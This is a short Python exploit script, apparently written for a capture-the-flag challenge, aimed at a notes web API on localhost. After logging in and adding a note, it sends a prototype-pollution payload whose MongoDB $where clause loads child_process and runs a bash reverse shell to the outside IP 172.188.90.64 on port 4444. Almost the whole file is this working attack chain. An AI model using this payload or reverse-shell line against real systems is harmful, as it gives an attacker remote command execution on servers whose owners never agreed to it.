import httpx

URL = "http://localhost:9141"


class BaseAPI:
    def __init__(self, url=URL) -> None:
        self.c = httpx.Client(base_url=url)


class API(BaseAPI):
    def login(s, name):
        return s.c.post("/api/v1/login", json={"name": name})

    def add_note(s, title, value):
        return s.c.post("/api/v1/note", json={"title": title, "value": value})

    def notes(s, populate):
        return s.c.post("/api/v1/notes", json=populate)


if __name__ == "__main__":
    api = API()
    api.login("dimas")
    api.add_note("test", "testing")
    # reference https://hackmd.io/@n4o847/BkUU7EPmp
    payload = {
        "path": "author",
        "match": [{"$where":'''typeof process === "undefined" ? true : import("child_process").then(cp=>{
            console.log(cp.execSync("bash -c 'sh -i >& /dev/tcp/172.188.90.64/4444 0>&1'").toString())
        })'''}],
    }
    res = api.notes({
        "constructor": {
            "prototype": payload
        }
    })
    print(res.text)
